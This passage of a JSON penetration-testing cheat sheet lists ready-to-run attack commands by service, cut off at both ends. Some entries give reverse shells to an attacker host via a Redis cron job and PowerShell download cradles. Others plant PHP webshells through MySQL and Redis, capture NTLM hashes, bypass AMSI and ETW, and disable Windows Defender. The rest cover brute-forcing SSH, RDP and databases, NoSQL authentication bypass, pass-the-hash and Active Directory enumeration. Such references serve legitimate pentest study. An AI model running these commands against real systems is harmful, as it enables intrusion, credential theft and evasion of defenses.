          { "title": "FTP Get All Files", "desc": "Download all files from FTP", "cmd": "wget -m ftp://anonymous:anonymous@<TARGET_IP>", "tags": ["essential"] },
          { "title": "cURL FTP Enum", "desc": "List FTP directory with curl", "cmd": "curl -v ftp://<TARGET_IP>/ --user anonymous:anonymous", "tags": ["tool"] }
        ]
      },
      {
        "name": "SSH (22)",
        "commands": [
          { "title": "SSH Connect Basic", "desc": "Connect to SSH server", "cmd": "ssh <USER>@<TARGET_IP>", "tags": ["essential"] },
          { "title": "SSH with Private Key", "desc": "Connect using private key file", "cmd": "ssh -i id_rsa <USER>@<TARGET_IP>", "tags": ["essential"] },
          { "title": "SSH Fix Key Permissions", "desc": "Fix private key permissions before use", "cmd": "chmod 600 id_rsa", "tags": ["essential"] },
          { "title": "Hydra SSH Brute Force", "desc": "Brute force SSH credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>", "tags": ["tool"] },
          { "title": "SSH User Enum (CVE-2018-15473)", "desc": "Enumerate valid SSH users", "cmd": "python3 ssh_user_enum.py --userList /usr/share/seclists/Usernames/top-usernames-shortlist.txt --ip <TARGET_IP>", "tags": ["advanced"] },
          { "title": "SSH Tunnel Local Forward", "desc": "Forward local port to remote service", "cmd": "ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> <USER>@<JUMP_IP> -N", "tags": ["essential"] },
          { "title": "SSH Tunnel Remote Forward", "desc": "Expose local service on remote server", "cmd": "ssh -R <REMOTE_PORT>:localhost:<LOCAL_PORT> <USER>@<TARGET_IP> -N", "tags": ["essential"] },
          { "title": "SSH Dynamic SOCKS Proxy", "desc": "Create SOCKS5 proxy through SSH", "cmd": "ssh -D 1080 <USER>@<TARGET_IP> -N", "tags": ["essential"] },
          { "title": "SSH ProxyJump", "desc": "Connect through jump host", "cmd": "ssh -J <USER>@<JUMP_IP> <USER>@<FINAL_TARGET>", "tags": ["tool"] },
          { "title": "SSH Force Password Auth", "desc": "Disable key auth and force password prompt", "cmd": "ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USER>@<TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "SMTP (25/587)",
        "commands": [
          { "title": "SMTP Banner Grab", "desc": "Connect and grab SMTP banner", "cmd": "nc -nv <TARGET_IP> 25", "tags": ["essential"] },
          { "title": "SMTP VRFY User Enum", "desc": "Enumerate valid users via VRFY command", "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["essential","tool"] },
          { "title": "SMTP EXPN User Enum", "desc": "Enumerate users via EXPN command", "cmd": "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["tool"] },
          { "title": "SMTP RCPT User Enum", "desc": "Enumerate users via RCPT TO method", "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>", "tags": ["tool"] },
          { "title": "SMTP Send Email (Swaks)", "desc": "Send test email via SMTP", "cmd": "swaks --to <VICTIM_EMAIL> --from <SENDER_EMAIL> --server <SMTP_IP> --body 'Test message' --header 'Subject: Test'", "tags": ["tool"] },
          { "title": "Hydra SMTP Brute", "desc": "Brute force SMTP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "POP3 / IMAP (110/143)",
        "commands": [
          { "title": "POP3 Manual Connect", "desc": "Connect to POP3 and check mail", "cmds": ["nc -nv <TARGET_IP> 110", "USER <USER>", "PASS <PASS>", "LIST", "RETR 1"], "tags": ["essential"] },
          { "title": "IMAP Manual Connect", "desc": "Connect to IMAP manually", "cmds": ["nc -nv <TARGET_IP> 143", "a1 LOGIN <USER> <PASS>", "a2 LIST '' '*'", "a3 SELECT INBOX", "a4 FETCH 1 BODY[]"], "tags": ["essential"] },
          { "title": "Hydra POP3 Brute", "desc": "Brute force POP3 credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>", "tags": ["tool"] },
          { "title": "cURL IMAP Read Mail", "desc": "Read emails with curl", "cmd": "curl -u <USER>:<PASS> imap://<TARGET_IP>/INBOX", "tags": ["tool"] }
        ]
      },
      {
        "name": "DNS (53)",
        "commands": [
          { "title": "DNS Zone Transfer", "desc": "Attempt AXFR zone transfer", "cmd": "dig axfr <DOMAIN> @<TARGET_IP>", "tags": ["essential"] },
          { "title": "DNS Reverse Lookup Zone", "desc": "Attempt reverse zone transfer", "cmd": "dig axfr <REVERSE_ZONE>.in-addr.arpa @<TARGET_IP>", "tags": ["tool"] },
          { "title": "DNSChef Spoof", "desc": "DNS spoofing proxy", "cmd": "dnschef --fakeip <ATTACKER_IP> --fakedomains <TARGET_DOMAIN> --interface <INTERFACE>", "tags": ["advanced"] },
          { "title": "Fierce DNS Recon", "desc": "DNS reconnaissance with fierce", "cmd": "fierce --domain <DOMAIN>", "tags": ["tool"] }
        ]
      },
      {
        "name": "HTTP/HTTPS (80/443/8080)",
        "commands": [
          { "title": "Nikto Web Scan", "desc": "Comprehensive web vulnerability scanner", "cmd": "nikto -h http://<TARGET_IP> -o nikto_output.txt", "tags": ["essential","tool"] },
          { "title": "cURL Headers", "desc": "Get HTTP headers and response info", "cmd": "curl -I http://<TARGET_IP>", "tags": ["essential"] },
          { "title": "cURL Follow Redirects", "desc": "Follow HTTP redirects verbosely", "cmd": "curl -Lv http://<TARGET_IP>", "tags": ["tool"] },
          { "title": "cURL POST Request", "desc": "Submit POST data", "cmd": "curl -X POST http://<TARGET_IP>/login -d 'username=<USER>&password=<PASS>'", "tags": ["essential"] },
          { "title": "cURL with Cookie", "desc": "Send request with cookie", "cmd": "curl -b 'session=<SESSION_VALUE>' http://<TARGET_IP>/admin", "tags": ["essential"] },
          { "title": "whatweb Fingerprint", "desc": "Identify web technologies", "cmd": "whatweb -a 3 http://<TARGET_IP>", "tags": ["essential","tool"] },
          { "title": "wafw00f WAF Detection", "desc": "Detect Web Application Firewalls", "cmd": "wafw00f http://<TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "SMB (445/139)",
        "commands": [
          { "title": "SMBClient List Shares", "desc": "List SMB shares (no auth)", "cmd": "smbclient -L //<TARGET_IP>/ -N", "tags": ["essential"] },
          { "title": "SMBClient Connect Share", "desc": "Connect to a specific share", "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER>", "tags": ["essential"] },
          { "title": "SMBClient Get File", "desc": "Download file from SMB share", "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER> -c 'get <FILENAME>'", "tags": ["essential"] },
          { "title": "SMBClient Recursive Download", "desc": "Download all files from share recursively", "cmds": ["smbclient //<TARGET_IP>/<SHARE> -U <USER>", "smb: \\> recurse ON", "smb: \\> prompt OFF", "smb: \\> mget *"], "tags": ["essential"] },
          { "title": "SMBMap Enumerate Shares", "desc": "Enumerate shares and permissions", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential","tool"] },
          { "title": "SMBMap Recursive Listing", "desc": "List all files on all shares", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -R", "tags": ["tool"] },
          { "title": "SMBMap Execute Command", "desc": "Execute command via SMBMap", "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -x 'ipconfig'", "tags": ["tool"] },
          { "title": "Mount SMB Share (Linux)", "desc": "Mount SMB share to local directory", "cmd": "sudo mount -t cifs //<TARGET_IP>/<SHARE> /mnt/share -o username=<USER>,password=<PASS>", "tags": ["essential"] },
          { "title": "EternalBlue (MS17-010)", "desc": "Exploit EternalBlue SMB vulnerability", "cmd": "python3 zzz_exploit.py <TARGET_IP>", "tags": ["advanced"], "note": "Use Metasploit module exploit/windows/smb/ms17_010_eternalblue for reliability" }
        ]
      },
      {
        "name": "MSSQL (1433)",
        "commands": [
          { "title": "Impacket MSSQL Connect", "desc": "Connect to MSSQL with impacket", "cmd": "mssqlclient.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth", "tags": ["essential","tool"] },
          { "title": "MSSQL SA Login", "desc": "Connect as SA user", "cmd": "mssqlclient.py sa:<PASS>@<TARGET_IP>", "tags": ["essential"] },
          { "title": "MSSQL Enable xp_cmdshell", "desc": "Enable xp_cmdshell for OS command execution", "cmds": ["EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "EXEC xp_cmdshell 'whoami';"], "tags": ["essential"] },
          { "title": "MSSQL List Databases", "desc": "List all databases", "cmd": "SELECT name FROM master.dbo.sysdatabases;", "tags": ["essential"] },
          { "title": "MSSQL List Users", "desc": "List database users and roles", "cmd": "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');", "tags": ["essential"] },
          { "title": "MSSQL Steal Hash (Responder)", "desc": "Force NTLM auth to capture hash", "cmd": "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';", "tags": ["advanced"] },
          { "title": "MSSQL Write File", "desc": "Write file via OLE Automation", "cmds": ["EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", "DECLARE @obj INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUTPUT; EXEC sp_OAMethod @obj, 'CreateTextFile', NULL, 'C:\\Temp\\test.txt', 1;"], "tags": ["advanced"] },
          { "title": "Sqsh MSSQL Connect", "desc": "Connect to MSSQL with sqsh", "cmd": "sqsh -S <TARGET_IP> -U <USER> -P '<PASS>' -D <DATABASE>", "tags": ["tool"] }
        ]
      },
      {
        "name": "MySQL (3306)",
        "commands": [
          { "title": "MySQL Connect Local", "desc": "Connect to MySQL locally", "cmd": "mysql -u <USER> -p'<PASS>' -h <TARGET_IP>", "tags": ["essential"] },
          { "title": "MySQL Show Databases", "desc": "List all databases", "cmd": "SHOW DATABASES;", "tags": ["essential"] },
          { "title": "MySQL Show Tables", "desc": "List tables in current database", "cmd": "USE <DATABASE>; SHOW TABLES;", "tags": ["essential"] },
          { "title": "MySQL Dump All Databases", "desc": "Dump all databases", "cmd": "mysqldump -u <USER> -p'<PASS>' -h <TARGET_IP> --all-databases > dump.sql", "tags": ["essential"] },
          { "title": "MySQL Read File", "desc": "Read local file via MySQL", "cmd": "SELECT LOAD_FILE('/etc/passwd');", "tags": ["advanced"] },
          { "title": "MySQL Write File (INTO OUTFILE)", "desc": "Write webshell via MySQL", "cmd": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';", "tags": ["advanced"] },
          { "title": "MySQL User Hashes", "desc": "Dump MySQL user hashes", "cmd": "SELECT user, authentication_string FROM mysql.user;", "tags": ["essential"] },
          { "title": "Hydra MySQL Brute", "desc": "Brute force MySQL credentials", "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "RDP (3389)",
        "commands": [
          { "title": "RDP Connect (xfreerdp)", "desc": "Connect to RDP with xfreerdp", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP>", "tags": ["essential"] },
          { "title": "RDP with Domain", "desc": "Connect to RDP with domain credentials", "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /p:'<PASS>' /v:<TARGET_IP>", "tags": ["essential"] },
          { "title": "RDP Pass-the-Hash", "desc": "Connect to RDP using NTLM hash (Restricted Admin required)", "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM_HASH> /v:<TARGET_IP> /cert-ignore", "tags": ["advanced"] },
          { "title": "RDP Drive Mount", "desc": "Mount local drive in RDP session", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /drive:share,/tmp", "tags": ["tool"] },
          { "title": "RDP Ignore Cert", "desc": "Ignore certificate warnings", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /cert-ignore", "tags": ["essential"] },
          { "title": "NLA Bypass Check", "desc": "Connect without NLA for older systems", "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> -sec-nla", "tags": ["tool"] },
          { "title": "Hydra RDP Brute", "desc": "Brute force RDP credentials", "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>", "tags": ["tool"] },
          { "title": "RDesktop Connect", "desc": "Connect via rdesktop", "cmd": "rdesktop -u <USER> -p '<PASS>' <TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "VNC (5900)",
        "commands": [
          { "title": "VNC Connect", "desc": "Connect to VNC server", "cmd": "vncviewer <TARGET_IP>:<PORT>", "tags": ["essential"] },
          { "title": "Hydra VNC Brute", "desc": "Brute force VNC password", "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>", "tags": ["tool"] },
          { "title": "Nmap VNC Auth Check", "desc": "Check VNC authentication type", "cmd": "nmap -sV --script vnc-info,vnc-brute <TARGET_IP>", "tags": ["tool"] }
        ]
      },
      {
        "name": "Redis (6379)",
        "commands": [
          { "title": "Redis Connect (No Auth)", "desc": "Connect to unauthenticated Redis", "cmd": "redis-cli -h <TARGET_IP>", "tags": ["essential"] },
          { "title": "Redis Auth", "desc": "Authenticate to Redis", "cmd": "redis-cli -h <TARGET_IP> -a '<PASS>'", "tags": ["essential"] },
          { "title": "Redis Info", "desc": "Get Redis server information", "cmd": "redis-cli -h <TARGET_IP> INFO", "tags": ["essential"] },
          { "title": "Redis List Keys", "desc": "List all keys in database", "cmd": "redis-cli -h <TARGET_IP> KEYS '*'", "tags": ["essential"] },
          { "title": "Redis Get All Values", "desc": "Dump all key-value pairs", "cmd": "redis-cli -h <TARGET_IP> --scan | xargs redis-cli -h <TARGET_IP> MGET", "tags": ["essential"] },
          { "title": "Redis Write SSH Key", "desc": "Write SSH authorized_keys via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys", "redis-cli -h <TARGET_IP> SET pwn '\\n\\n<SSH_PUBLIC_KEY>\\n\\n'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] },
          { "title": "Redis Write Webshell", "desc": "Write PHP webshell via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php", "redis-cli -h <TARGET_IP> SET shell '<?php system($_GET[\"cmd\"]); ?>'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] },
          { "title": "Redis Cron Job RCE", "desc": "Write cron job for reverse shell via Redis", "cmds": ["redis-cli -h <TARGET_IP> CONFIG SET dir /var/spool/cron/crontabs", "redis-cli -h <TARGET_IP> CONFIG SET dbfilename root", "redis-cli -h <TARGET_IP> SET shell '\\n\\n* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\\n\\n'", "redis-cli -h <TARGET_IP> BGSAVE"], "tags": ["advanced"] }
        ]
      },
      {
        "name": "MongoDB (27017)",
        "commands": [
          { "title": "MongoDB Connect (No Auth)", "desc": "Connect to unauthenticated MongoDB", "cmd": "mongo <TARGET_IP>", "tags": ["essential"] },
          { "title": "MongoDB List Databases", "desc": "Show all databases", "cmd": "show dbs", "tags": ["essential"] },
          { "title": "MongoDB List Collections", "desc": "Show collections in current DB", "cmd": "use <DATABASE>; show collections;", "tags": ["essential"] },
          { "title": "MongoDB Dump All", "desc": "Dump all MongoDB data", "cmd": "mongodump --host <TARGET_IP> --out /tmp/mongodump", "tags": ["essential"] },
          { "title": "MongoDB NoSQLi Auth Bypass", "desc": "Authentication bypass via NoSQL injection", "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'", "tags": ["advanced"] }
        ]
      },
      {
        "name": "NFS (2049)",
        "commands": [
          { "title": "Show NFS Exports", "desc": "List NFS exported directories", "cmd": "showmount -e <TARGET_IP>", "tags": ["essential"] },
          { "title": "Mount NFS Share", "desc": "Mount NFS share locally", "cmd": "sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "tags": ["essential"] },
          { "title": "Mount NFS v3", "desc": "Force NFS version 3", "cmd": "sudo mount -t nfs -o vers=3 <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "tags": ["tool"] },
          { "title": "NFS no_root_squash Abuse", "desc": "Write SUID bash if no_root_squash is set", "cmds": ["sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs", "cp /bin/bash /mnt/nfs/bash", "sudo chmod +s /mnt/nfs/bash"], "tags": ["advanced"], "note": "Then on target: /tmp/bash -p" }
        ]
      },
      {
        "name": "LDAP (389/636)",
        "commands": [
          { "title": "LDAP Anonymous Bind", "desc": "Test anonymous LDAP bind", "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>'", "tags": ["essential"] },
          { "title": "LDAP Authenticated Bind", "desc": "Query LDAP with credentials", "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>'", "tags": ["essential"] },
          { "title": "LDAP Dump All Users", "desc": "Enumerate all AD users", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=user)' sAMAccountName userPrincipalName memberOf", "tags": ["essential"] },
          { "title": "LDAP Dump All Computers", "desc": "List all computer objects", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=computer)' name operatingSystem", "tags": ["essential"] },
          { "title": "LDAP Dump Domain Admins", "desc": "Get Domain Admin group members", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(memberOf=CN=Domain Admins,CN=Users,DC=<DC>,DC=<TLD>)' sAMAccountName", "tags": ["essential"] },
          { "title": "LDAP Password in Attributes", "desc": "Search for passwords in LDAP attributes", "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(description=*pass*)' sAMAccountName description", "tags": ["advanced"] },
          { "title": "ldapdomaindump", "desc": "Comprehensive LDAP dump to HTML/JSON", "cmd": "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o /tmp/ldap_dump", "tags": ["essential","tool"] }
        ]
      },
      {
        "name": "WinRM (5985/5986)",
        "commands": [
          { "title": "Evil-WinRM Connect", "desc": "Connect to WinRM with Evil-WinRM", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'", "tags": ["essential","tool"] },
          { "title": "Evil-WinRM with Hash", "desc": "Pass-the-hash via WinRM", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>", "tags": ["essential"] },
          { "title": "Evil-WinRM with SSL", "desc": "Connect to WinRM with SSL (5986)", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S", "tags": ["tool"] },
          { "title": "Evil-WinRM File Upload", "desc": "Upload file to target", "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /path/to/scripts/ -e /path/to/executables/", "tags": ["tool"] },
          { "title": "Evil-WinRM Run Script", "desc": "Load and run PowerShell script", "cmd": "Invoke-Binary /path/to/script.ps1", "tags": ["tool"], "note": "Run inside evil-winrm session" }
        ]
      }
    ]
  },
  {
    "id": "powershell-pentest",
    "name": "PowerShell for Pentesters",
    "icon": "⚡",
    "description": "PowerShell commands for Active Directory enumeration, exploitation, and post-exploitation using PowerView, PowerUp, and native cmdlets.",
    "subcategories": [
      {
        "name": "PowerShell Basics & Execution",
        "commands": [
          { "title": "Bypass ExecutionPolicy", "desc": "Bypass PowerShell execution policy", "cmd": "powershell -ep bypass", "tags": ["essential"] },
          { "title": "PowerShell Download Cradle", "desc": "Download and execute script in memory", "cmd": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/<SCRIPT>.ps1')\"", "tags": ["essential"] },
          { "title": "PowerShell EncodedCommand", "desc": "Execute base64 encoded command", "cmd": "powershell -ep bypass -enc <BASE64_CMD>", "tags": ["essential"] },
          { "title": "Encode PS Command (Linux)", "desc": "Encode PowerShell command to base64", "cmd": "echo -n \"<PS_COMMAND>\" | iconv -t UTF-16LE | base64 -w 0", "tags": ["essential"] },
          { "title": "PowerShell Invoke-Expression", "desc": "Execute string as command", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')", "tags": ["essential"] },
          { "title": "PowerShell Download File", "desc": "Download file to disk", "cmd": "Invoke-WebRequest -Uri 'http://<ATTACKER_IP>/file.exe' -OutFile 'C:\\Temp\\file.exe'", "tags": ["essential"] },
          { "title": "PowerShell Check Language Mode", "desc": "Check if in constrained language mode", "cmd": "$ExecutionContext.SessionState.LanguageMode", "tags": ["tool"] },
          { "title": "PowerShell Version", "desc": "Check PowerShell version", "cmd": "$PSVersionTable.PSVersion", "tags": ["tool"] },
          { "title": "Disable AMSI (Reflection)", "desc": "Disable AMSI via reflection", "cmd": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)", "tags": ["advanced"] }
        ]
      },
      {
        "name": "PowerView — AD Enumeration",
        "commands": [
          { "title": "Import PowerView", "desc": "Load PowerView into memory", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerView.ps1')", "tags": ["essential","tool"] },
          { "title": "Get Domain Info", "desc": "Get domain information", "cmd": "Get-Domain", "tags": ["essential"] },
          { "title": "Get Domain Controller", "desc": "List domain controllers", "cmd": "Get-DomainController", "tags": ["essential"] },
          { "title": "Get All Domain Users", "desc": "Enumerate all domain users", "cmd": "Get-DomainUser | select samaccountname,description,memberof", "tags": ["essential"] },
          { "title": "Get User Description", "desc": "Find passwords in user descriptions", "cmd": "Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname,description", "tags": ["essential"] },
          { "title": "Get Domain Groups", "desc": "List all domain groups", "cmd": "Get-DomainGroup | select name", "tags": ["essential"] },
          { "title": "Get Domain Admin Members", "desc": "List Domain Admin group members", "cmd": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName", "tags": ["essential"] },
          { "title": "Get Domain Computers", "desc": "List all domain computers", "cmd": "Get-DomainComputer | select name,operatingsystem", "tags": ["essential"] },
          { "title": "Find Local Admins", "desc": "Find local admin rights for current user", "cmd": "Find-LocalAdminAccess", "tags": ["essential"] },
          { "title": "Get Logged On Users", "desc": "Get logged on users across domain", "cmd": "Get-NetLoggedon -ComputerName <COMPUTER>", "tags": ["tool"] },
          { "title": "Get Domain Trusts", "desc": "Enumerate domain trusts", "cmd": "Get-DomainTrust", "tags": ["essential"] },
          { "title": "Get Forest Trusts", "desc": "Enumerate forest trusts", "cmd": "Get-ForestTrust", "tags": ["tool"] },
          { "title": "Find Interesting Files", "desc": "Search for sensitive files on shares", "cmd": "Find-InterestingDomainShareFile -Include *.txt,*.pdf,*.xls,*.doc,*.ps1,*.bat", "tags": ["advanced"] },
          { "title": "Get SPNs (Kerberoast)", "desc": "Find all service principal names", "cmd": "Get-DomainUser -SPN | select samaccountname,serviceprincipalname", "tags": ["essential"] },
          { "title": "Invoke-Kerberoast", "desc": "Kerberoast all SPNs and output hashes", "cmd": "Invoke-Kerberoast | fl", "tags": ["essential"] },
          { "title": "Get ASREPRoast Targets", "desc": "Find accounts with pre-auth disabled", "cmd": "Get-DomainUser -PreauthNotRequired | select samaccountname", "tags": ["essential"] },
          { "title": "Get ACL Rights", "desc": "Find ACL rights for a specific user", "cmd": "Get-DomainObjectAcl -Identity '<USER>' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteProperty|WriteDacl'}", "tags": ["advanced"] },
          { "title": "Find ObjectAcl Write Paths", "desc": "Find write/modify rights across all objects", "cmd": "Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match '<USER>'}", "tags": ["advanced"] },
          { "title": "Unconstrained Delegation", "desc": "Find computers with unconstrained delegation", "cmd": "Get-DomainComputer -Unconstrained | select name", "tags": ["essential"] },
          { "title": "Constrained Delegation", "desc": "Find accounts with constrained delegation", "cmd": "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto", "tags": ["essential"] }
        ]
      },
      {
        "name": "PowerUp — Privilege Escalation",
        "commands": [
          { "title": "Import PowerUp", "desc": "Load PowerUp into memory", "cmd": "IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')", "tags": ["essential","tool"] },
          { "title": "Invoke-AllChecks", "desc": "Run all PowerUp privilege escalation checks", "cmd": "Invoke-AllChecks", "tags": ["essential"] },
          { "title": "Get-ServiceUnquoted", "desc": "Find services with unquoted paths", "cmd": "Get-ServiceUnquoted | select ServiceName,PathName", "tags": ["essential"] },
          { "title": "Get-ModifiableService", "desc": "Find services current user can modify", "cmd": "Get-ModifiableService | select ServiceName", "tags": ["essential"] },
          { "title": "Get-ModifiableServiceFile", "desc": "Find services with writable binaries", "cmd": "Get-ModifiableServiceFile | select ServiceName,ModifiablePath", "tags": ["essential"] },
          { "title": "Invoke-ServiceAbuse", "desc": "Abuse modifiable service to add local admin", "cmd": "Invoke-ServiceAbuse -ServiceName '<SERVICE>' -UserName '<DOMAIN>\\<USER>'", "tags": ["advanced"] },
          { "title": "Write-ServiceBinary", "desc": "Replace service binary with custom payload", "cmd": "Write-ServiceBinary -ServiceName '<SERVICE>' -Path C:\\Temp\\payload.exe", "tags": ["advanced"] },
          { "title": "Get AlwaysInstallElevated", "desc": "Check AlwaysInstallElevated registry key", "cmd": "Get-RegistryAlwaysInstallElevated", "tags": ["essential"] },
          { "title": "Get-UnattendedInstallFiles", "desc": "Find unattended installation files with creds", "cmd": "Get-UnattendedInstallFile", "tags": ["essential"] },
          { "title": "Get-CachedGPPPassword", "desc": "Find cached GPP passwords", "cmd": "Get-CachedGPPPassword", "tags": ["essential"] }
        ]
      },
      {
        "name": "AMSI & Defense Bypass",
        "commands": [
          { "title": "AMSI Bypass - Matt Graeber", "desc": "Classic AMSI bypass via reflection", "cmd": "[System.Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null), 1)", "tags": ["advanced"] },
          { "title": "AMSI Bypass - Patching", "desc": "Patch AMSI.dll in memory", "cmd": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true)", "tags": ["advanced"] },
          { "title": "Disable Windows Defender (Admin)", "desc": "Disable Defender real-time protection", "cmd": "Set-MpPreference -DisableRealtimeMonitoring $true", "tags": ["advanced"] },
          { "title": "Add Defender Exclusion", "desc": "Add path to Defender exclusion list", "cmd": "Add-MpPreference -ExclusionPath 'C:\\Temp'", "tags": ["advanced"] },
          { "title": "ETW Bypass", "desc": "Disable ETW logging for current PS process", "cmd": "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)", "tags": ["advanced"] }
        ]
      },
      {
        "name": "Active Directory Module (Native)",
        "commands": [
          { "title": "Import AD Module", "desc": "Import Active Directory PowerShell module", "cmd": "Import-Module ActiveDirectory", "tags": ["essential"] },
          { "title": "Get-ADUser All", "desc": "List all AD users", "cmd": "Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description", "tags": ["essential"] },
          { "title": "Get-ADGroup Members", "desc": "List members of a group", "cmd": "Get-ADGroupMember -Identity 'Domain Admins' -Recursive | select Name", "tags": ["essential"] },
          { "title": "Get-ADComputer All", "desc": "List all domain computers", "cmd": "Get-ADComputer -Filter * -Properties * | select Name,OperatingSystem,IPv4Address", "tags": ["essential"] },
          { "title": "Get-ADDomainController", "desc": "List domain controllers", "cmd": "Get-ADDomainController -Filter *", "tags": ["essential"] },
          { "title": "Get-ADTrust", "desc": "List domain trusts", "cmd": "Get-ADTrust -Filter *", "tags": ["tool"] },
          { "title": "Set-ADAccountPassword", "desc": "Reset user password (if rights allow)", "cmd": "Set-ADAccountPassword -Identity <USER> -Reset -NewPassword (ConvertTo-SecureString '<NEW_PASS>' -AsPlainText -Force)", "tags": ["advanced"] }
        ]
      }
    ]
  },
  {
    "id": "impacket-suite",
    "name": "Impacket Toolsuite",
    "icon": "🐍",
    "description": "Comprehensive Impacket tools for Windows/AD protocol attacks, credential dumping, and lateral movement.",
    "subcategories": [
      {
        "name": "Remote Execution",
        "commands": [
          { "title": "PsExec Remote Shell", "desc": "Get SYSTEM shell via SMB", "cmd": "psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>", "tags": ["essential","tool"] },
          { "title": "PsExec with Hash", "desc": "PsExec using NTLM hash", "cmd": "psexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>", "tags": ["essential"] },
